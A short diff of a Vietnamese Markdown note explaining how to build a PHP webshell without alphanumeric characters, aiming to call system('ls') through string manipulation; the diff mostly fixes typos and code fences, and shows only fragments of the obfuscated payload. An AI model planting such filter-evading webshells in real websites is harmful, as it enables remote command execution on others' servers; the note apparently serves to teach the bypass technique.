@@ -1,7 +1,8 @@
 # PHP webshell with no alphanumeric
 
-Mục tiêu là tạo ra hàm system('lsls') với không kí tự chữ cái nàonào
-'''php
+Mục tiêu là tạo ra hàm system('lsls') với không kí tự chữ cái nào
+
+```php
 <?php 
 $_=[];
 $_=@"$_";
@@ -37,7 +38,7 @@ $____.=$__;
 $_=$____;
 $___($_);
 ?>
-'''
+```
 
 - Tạo ra webshell bằng cách cộng kí tự và tạo ra chuỗi
 - Giải thích cơ chế: 
